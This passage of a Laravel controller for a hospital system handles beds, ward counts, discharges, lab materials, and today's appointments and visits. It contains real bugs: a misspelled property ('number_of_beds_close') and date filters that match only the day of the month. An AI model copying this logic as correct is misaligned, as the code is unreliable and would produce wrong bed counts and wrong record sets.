                ->update(['available_beds' => $available_beds, 'number_of_beds' => $number_of_beds, 'updated_at' => date("Y-m-d  H:i:s")]);

        }

        if ($beds->bed_status == 'closed') {

            if ($wards->number_of_beds_closed != 0) {
                $number_of_beds_closed = $wards->number_of_beds_closed - 1;
            } else {
                $number_of_beds_closed = $wards->number_of_beds_close;
            }

            if ($wards->number_of_beds != 0) {
                $number_of_beds = $wards->number_of_beds - 1;
            } else {
                $number_of_beds = $wards->number_of_beds;
            }

            DB::table('wards')
                ->where('id', $ward_id)
                ->update(['number_of_beds_closed' => $number_of_beds_closed, 'number_of_beds' => $number_of_beds, 'updated_at' => date("Y-m-d  H:i:s")]);
        }



        return response()->json(['status' => true, 'message' => 'Bed Deleted Successfully']);


    }

    public function edit_patient_bed(Request $request){

        $ward_id = $request->input('ward_id');
        $bed_id = $request->input('bed_id');
        $status = $request->input('status');


        $beds = DB::table('beds')
               ->select(DB::raw('bed_status'))
               ->where('status', 1)
               ->where('id', $bed_id)
               ->first();

        if ($beds->bed_status == 'occupied' || $status == 'occupied') {

            return response()->json(['status' => false, 'message' => 'This Bed Can not be updated']);

        }

        DB::table('beds')
            ->where('id', $bed_id)
            ->update(['bed_status' => $status,'updated_at' => date("Y-m-d  H:i:s")]);


        $wards = DB::table('wards')
            ->select(DB::raw('number_of_beds,available_beds,number_of_beds_closed'))
            ->where('wards.status', 1)
            ->where('id', $ward_id)
            ->first();

        if ($status == 'available') {

            $available_beds = $wards->available_beds + 1;

            if ($wards->number_of_beds_closed != 0) {
                $number_of_beds_closed = $wards->number_of_beds_closed - 1;
            } else {
                $number_of_beds_closed = $wards->number_of_beds_close;
            }

            DB::table('wards')
                ->where('id', $ward_id)
                ->update(['available_beds'=> $available_beds,'number_of_beds_closed'=> $number_of_beds_closed,'updated_at' => date("Y-m-d  H:i:s")]);

        }

        if ($status == 'closed') {

            $number_of_beds_closed = $wards->number_of_beds_closed + 1;
            if ($wards->available_beds != 0) {
                $available_beds = $wards->available_beds - 1;
            } else {
                $available_beds = $wards->available_beds;
            }

            DB::table('wards')
                ->where('id', $ward_id)
                ->update(['number_of_beds_closed' => $number_of_beds_closed,'available_beds' => $available_beds,'updated_at' => date("Y-m-d  H:i:s")]);
        }


        return response()->json(['status' => true, 'message' => 'Bed Updated Successfully']);


    }

    public function patients_discharged(Request $request){
        $within_24 = date('Y-m-d H:i:s', strtotime(date('Y-m-d H:i:s') . ' +1 day'));
        $within_48 = date('Y-m-d H:i:s', strtotime(date('Y-m-d H:i:s') . ' +2 day'));
        $patients_admitted = DB::table('patients_admitted AS pa')
            ->leftJoin('wards', 'wards.id', '=', 'pa.ward_id')
            ->select(DB::raw('pa.patient_id,wards.name,wards.available_beds as empty,
            (SELECT count(*) from patients_admitted  where patient_id= pa.patient_id and expected_discharge_date > "'.$within_48.'" and is_discharged = 0) as over_fourtyeight_hour_count,
            (SELECT count(*) from patients_admitted  where patient_id= pa.patient_id and expected_discharge_date < "'.$within_48.'" and is_discharged = 0) as under_fourtyeight_hour_count,
            (SELECT count(*) from patients_admitted  where patient_id= pa.patient_id and expected_discharge_date < "'.$within_48.'" and  expected_discharge_date > "'.$within_24.'" and is_discharged = 0) as twentyfour_to_fourtyeight'))
            ->where('pa.is_discharged', 0)
            ->get();


        return response()->json(['status' => true, 'data'=>$patients_admitted]);
    }




    public function add_material(Request $request){

        $lab_order_id = $request->input('lab_order_id');
        $material = $request->input('material');
        $patient_materials  = json_decode($material);
        $currentdatetime = date("Y-m-d  H:i:s");

        foreach ($patient_materials as $materials) {

            DB::table('materials')
                ->insert(
                    ['order_id' => $lab_order_id,
                        'material' => $materials->material,
                        'cost' => $materials->cost,
                        'quantity' => $materials->quantity,
                        'created_at' => $currentdatetime
                    ]
                );

        }

        return response()->json(['status' => true, 'message' => 'Material Added Successfully']);

    }

    public function add_prescription_material(Request $request)
    {
        $prescripion_id = $request->input('prescripion_id');
        $material = $request->input('material');
        $patient_materials = json_decode($material);
        $currentdatetime = date("Y-m-d  H:i:s");

        foreach ($patient_materials as $materials) {

            DB::table('materials')
                ->insert(
                    ['prescription_id' => $prescripion_id,
                        'material' => $materials->material,
                        'cost' => $materials->cost,
                        'quantity' => $materials->quantity,
                        'created_at' => $currentdatetime
                    ]
                );
        }

        return response()->json(['status' => true, 'message' => 'Material Added Successfully']);


    }


    public function get_all_todays_appointments(Request $request){

        $limit = $request->input('limit');
        $offset = $request->input('offset');
        if ($limit > 0 || $offset > 0) {
            $appointments = DB::table('appointments')
                ->select(DB::raw('appointments.id,appointments.patient_id,patients.first_name,patients.middle_name,patients.last_name,doctors.name as doctor,departments.name as department,appointments.reason,appointments.other_reasons,pick_date,appointment_status,start_time'))
                ->leftJoin('patients', 'appointments.patient_id', '=', 'patients.id')
                ->leftJoin('doctors', 'appointments.doctor_id', '=', 'doctors.id')
                ->leftJoin('departments', 'appointments.department_id', '=', 'departments.id')
                ->whereDay('appointments.pick_date', '=', date('d'))
                ->where('appointments.status',1)
                ->where('patients.status', 1)
                ->skip($offset)->take($limit)
                ->get();


            $count = DB::table('appointments')
                ->select(DB::raw('appointments.id,appointments.patient_id,patients.first_name,patients.middle_name,patients.last_name,doctors.name as doctor,departments.name as department,appointments.reason,appointments.other_reasons,pick_date,appointment_status,start_time'))
                ->leftJoin('patients', 'appointments.patient_id', '=', 'patients.id')
                ->leftJoin('doctors', 'appointments.doctor_id', '=', 'doctors.id')
                ->leftJoin('departments', 'appointments.department_id', '=', 'departments.id')
                ->whereDay('appointments.pick_date', '=', date('d'))
                ->where('appointments.status', 1)
                ->where('patients.status', 1)
                ->count();
        } else {
            $appointments = DB::table('appointments')
                ->select(DB::raw('appointments.id,appointments.patient_id,patients.first_name,patients.middle_name,patients.last_name,doctors.name as doctor,departments.name as department,appointments.reason,appointments.other_reasons,pick_date,appointment_status,start_time'))
                ->leftJoin('patients', 'appointments.patient_id', '=', 'patients.id')
                ->leftJoin('doctors', 'appointments.doctor_id', '=', 'doctors.id')
                ->leftJoin('departments', 'appointments.department_id', '=', 'departments.id')
                ->whereDay('appointments.pick_date', '=', date('d'))
                ->where('appointments.status', 1)
                ->where('patients.status', 1)
                ->get();
            $count = DB::table('appointments')
                ->select(DB::raw('appointments.id,appointments.patient_id,patients.first_name,patients.middle_name,patients.last_name,doctors.name as doctor,departments.name as department,appointments.reason,appointments.other_reasons,pick_date,appointment_status,start_time'))
                ->leftJoin('patients', 'appointments.patient_id', '=', 'patients.id')
                ->leftJoin('doctors', 'appointments.doctor_id', '=', 'doctors.id')
                ->leftJoin('departments', 'appointments.department_id', '=', 'departments.id')
                ->whereDay('appointments.pick_date', '=', date('d'))
                ->where('appointments.status', 1)
                ->where('patients.status', 1)
                ->count();

        }

        return response()->json(['status' => true, 'data' => $appointments, 'count' => $count]);

    }


    public function get_todays_all_visits(Request $request){
        $limit = $request->input('limit');
        $offset = $request->input('offset');

        if ($limit > 0 || $offset > 0) {
            $visits = DB::table('visits')
                ->select(DB::raw('visits.id,visits.created_at,visits.encounter_type,doctors.name,visits.decscribe_whom_to_see,patients.first_name,patients.middle_name,patients.last_name,visits.reason_of_visit'))
                ->leftJoin('doctors', 'doctors.id', '=', 'visits.whom_to_see')
                ->leftJoin('patients', 'patients.id', '=', 'visits.patient_id')
                ->whereDay('visits.created_at', '=', date('d'))
                ->where('visits.status',1)
                ->skip($offset)->take($limit)
                ->get();
            $count = DB::table('visits')
                ->select(DB::raw('visits.id,visits.created_at,visits.encounter_type,doctors.name,visits.decscribe_whom_to_see,patients.first_name,patients.middle_name,patients.last_name,visits.reason_of_visit'))
                ->leftJoin('doctors', 'doctors.id', '=', 'visits.whom_to_see')
                ->leftJoin('patients', 'patients.id', '=', 'visits.patient_id')
                ->whereDay('visits.created_at', '=', date('d'))
                ->where('visits.status', 1)
                ->count();
        } else {
            $visits = DB::table('visits')
                ->select(DB::raw('visits.id,visits.created_at,visits.encounter_type,doctors.name,visits.decscribe_whom_to_see,patients.first_name,patients.middle_name,patients.last_name,visits.reason_of_visit'))
                ->leftJoin('doctors', 'doctors.id', '=', 'visits.whom_to_see')
                ->leftJoin('patients', 'patients.id', '=', 'visits.patient_id')
                ->whereDay('visits.created_at', '=', date('d'))
                ->where('visits.status', 1)
                ->get();
            $count = count($visits);
        }

        foreach($visits as $visit){
            $visit->created_at = date("H:i:s",strtotime($visit->created_at));
        }

        return response()->json(['status' => true, 'data' => $visits, 'count' => $count]);
    }
}

